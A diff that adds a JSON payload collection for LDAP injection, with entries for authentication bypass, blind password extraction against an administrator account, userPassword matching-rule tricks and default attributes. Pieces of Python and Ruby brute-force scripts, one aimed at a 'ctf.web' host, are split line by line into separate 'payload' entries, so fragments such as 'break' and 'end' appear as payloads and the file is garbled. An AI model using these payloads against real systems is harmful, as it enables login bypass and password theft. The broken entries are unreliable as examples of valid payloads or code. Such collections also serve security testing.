@@ -1,0 +1,524 @@
+[
+  {
+    "id": "ldap-injection-1",
+    "title": "Authentication Bypass",
+    "payload": "user  = *)(uid=*))(|(uid=*",
+    "context": "Authentication Bypass",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-2",
+    "title": "Authentication Bypass",
+    "payload": "pass  = password",
+    "context": "Authentication Bypass",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-3",
+    "title": "Authentication Bypass",
+    "payload": "query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))",
+    "context": "Authentication Bypass",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-4",
+    "title": "Authentication Bypass",
+    "payload": "user  = admin)(!(&(1=0",
+    "context": "Authentication Bypass",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-5",
+    "title": "Authentication Bypass",
+    "payload": "pass  = q))",
+    "context": "Authentication Bypass",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-6",
+    "title": "Authentication Bypass",
+    "payload": "query = (&(uid=admin)(!(&(1=0)(userPassword=q))))",
+    "context": "Authentication Bypass",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-7",
+    "title": "Blind Exploitation",
+    "payload": "(&(sn=administrator)(password=*))    : OK",
+    "context": "Blind Exploitation",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-8",
+    "title": "Blind Exploitation",
+    "payload": "(&(sn=administrator)(password=A*))   : KO",
+    "context": "Blind Exploitation",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-9",
+    "title": "Blind Exploitation",
+    "payload": "(&(sn=administrator)(password=B*))   : KO",
+    "context": "Blind Exploitation",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-10",
+    "title": "Blind Exploitation",
+    "payload": "...",
+    "context": "Blind Exploitation",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-11",
+    "title": "Blind Exploitation",
+    "payload": "(&(sn=administrator)(password=M*))   : OK",
+    "context": "Blind Exploitation",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-12",
+    "title": "Blind Exploitation",
+    "payload": "(&(sn=administrator)(password=MA*))  : KO",
+    "context": "Blind Exploitation",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-13",
+    "title": "Blind Exploitation",
+    "payload": "(&(sn=administrator)(password=MB*))  : KO",
+    "context": "Blind Exploitation",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-14",
+    "title": "Blind Exploitation",
+    "payload": "(&(sn=administrator)(password=MY*))  : OK",
+    "context": "Blind Exploitation",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-15",
+    "title": "Blind Exploitation",
+    "payload": "(&(sn=administrator)(password=MYA*)) : KO",
+    "context": "Blind Exploitation",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-16",
+    "title": "Blind Exploitation",
+    "payload": "(&(sn=administrator)(password=MYB*)) : KO",
+    "context": "Blind Exploitation",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-17",
+    "title": "Blind Exploitation",
+    "payload": "(&(sn=administrator)(password=MYC*)) : KO",
+    "context": "Blind Exploitation",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-18",
+    "title": "Blind Exploitation",
+    "payload": "(&(sn=administrator)(password=MYK*)) : OK",
+    "context": "Blind Exploitation",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-19",
+    "title": "Blind Exploitation",
+    "payload": "(&(sn=administrator)(password=MYKE)) : OK",
+    "context": "Blind Exploitation",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-20",
+    "title": "Blind Exploitation",
+    "payload": "(sn=administrator)",
+    "context": "Blind Exploitation",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-21",
+    "title": "Blind Exploitation",
+    "payload": "(password=X*)",
+    "context": "Blind Exploitation",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-22",
+    "title": "Defaults Attributes",
+    "payload": "userPassword",
+    "context": "Defaults Attributes",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-23",
+    "title": "Defaults Attributes",
+    "payload": "surname",
+    "context": "Defaults Attributes",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-24",
+    "title": "Defaults Attributes",
+    "payload": "name",
+    "context": "Defaults Attributes",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-25",
+    "title": "Defaults Attributes",
+    "payload": "cn",
+    "context": "Defaults Attributes",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-26",
+    "title": "Defaults Attributes",
+    "payload": "sn",
+    "context": "Defaults Attributes",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-27",
+    "title": "Defaults Attributes",
+    "payload": "objectClass",
+    "context": "Defaults Attributes",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-28",
+    "title": "Defaults Attributes",
+    "payload": "mail",
+    "context": "Defaults Attributes",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-29",
+    "title": "Defaults Attributes",
+    "payload": "givenName",
+    "context": "Defaults Attributes",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-30",
+    "title": "Defaults Attributes",
+    "payload": "commonName",
+    "context": "Defaults Attributes",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-31",
+    "title": "Exploiting userPassword Attribute",
+    "payload": "userPassword:2.5.13.18:=\\xx (\\xx is a byte)",
+    "context": "Exploiting userPassword Attribute",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-32",
+    "title": "Exploiting userPassword Attribute",
+    "payload": "userPassword:2.5.13.18:=\\xx\\xx",
+    "context": "Exploiting userPassword Attribute",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-33",
+    "title": "Exploiting userPassword Attribute",
+    "payload": "userPassword:2.5.13.18:=\\xx\\xx\\xx",
+    "context": "Exploiting userPassword Attribute",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-34",
+    "title": "Discover Valid LDAP Fields",
+    "payload": "fields = []",
+    "context": "Discover Valid LDAP Fields",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-35",
+    "title": "Discover Valid LDAP Fields",
+    "payload": "url = 'https://URL.com/'",
+    "context": "Discover Valid LDAP Fields",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-36",
+    "title": "Discover Valid LDAP Fields",
+    "payload": "f = open('dic', 'r')",
+    "context": "Discover Valid LDAP Fields",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-37",
+    "title": "Discover Valid LDAP Fields",
+    "payload": "world = f.read().split('\\n')",
+    "context": "Discover Valid LDAP Fields",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-38",
+    "title": "Discover Valid LDAP Fields",
+    "payload": "f.close()",
+    "context": "Discover Valid LDAP Fields",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-39",
+    "title": "Discover Valid LDAP Fields",
+    "payload": "for i in world:",
+    "context": "Discover Valid LDAP Fields",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-40",
+    "title": "Discover Valid LDAP Fields",
+    "payload": "if 'TRUE CONDITION' in r.text:",
+    "context": "Discover Valid LDAP Fields",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-41",
+    "title": "Discover Valid LDAP Fields",
+    "payload": "fields.append(str(i))",
+    "context": "Discover Valid LDAP Fields",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-42",
+    "title": "Special Blind LDAP Injection",
+    "payload": "alphabet = string.ascii_letters + string.digits + \"_@{}-/()!\\\"$%=^[]:;\"",
+    "context": "Special Blind LDAP Injection",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-43",
+    "title": "Special Blind LDAP Injection",
+    "payload": "flag = \"\"",
+    "context": "Special Blind LDAP Injection",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-44",
+    "title": "Special Blind LDAP Injection",
+    "payload": "for i in range(50):",
+    "context": "Special Blind LDAP Injection",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-45",
+    "title": "Special Blind LDAP Injection",
+    "payload": "for char in alphabet:",
+    "context": "Special Blind LDAP Injection",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-46",
+    "title": "Special Blind LDAP Injection",
+    "payload": "if (\"TRUE CONDITION\" in r.text):",
+    "context": "Special Blind LDAP Injection",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-47",
+    "title": "Special Blind LDAP Injection",
+    "payload": "flag += char",
+    "context": "Special Blind LDAP Injection",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-48",
+    "title": "Special Blind LDAP Injection",
+    "payload": "break",
+    "context": "Special Blind LDAP Injection",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-49",
+    "title": "Special Blind LDAP Injection",
+    "payload": "require 'net/http'",
+    "context": "Special Blind LDAP Injection",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-50",
+    "title": "Special Blind LDAP Injection",
+    "payload": "alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!\"$%=^[]:;'.split('')",
+    "context": "Special Blind LDAP Injection",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-51",
+    "title": "Special Blind LDAP Injection",
+    "payload": "flag = ''",
+    "context": "Special Blind LDAP Injection",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-52",
+    "title": "Special Blind LDAP Injection",
+    "payload": "(0..50).each do |i|",
+    "context": "Special Blind LDAP Injection",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-53",
+    "title": "Special Blind LDAP Injection",
+    "payload": "puts(\"[i] Looking for number #{i}\")",
+    "context": "Special Blind LDAP Injection",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-54",
+    "title": "Special Blind LDAP Injection",
+    "payload": "alphabet.each do |char|",
+    "context": "Special Blind LDAP Injection",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-55",
+    "title": "Special Blind LDAP Injection",
+    "payload": "r = Net::HTTP.get(URI(\"http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}\"))",
+    "context": "Special Blind LDAP Injection",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-56",
+    "title": "Special Blind LDAP Injection",
+    "payload": "if /TRUE CONDITION/.match?(r)",
+    "context": "Special Blind LDAP Injection",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-57",
+    "title": "Special Blind LDAP Injection",
+    "payload": "puts(\"[+] Flag: #{flag}\")",
+    "context": "Special Blind LDAP Injection",
+    "tags": [
+      "ldap-injection"
+    ]
+  },
+  {
+    "id": "ldap-injection-58",
+    "title": "Special Blind LDAP Injection",
+    "payload": "end",
+    "context": "Special Blind LDAP Injection",
+    "tags": [
+      "ldap-injection"
+    ]
+  }
+]
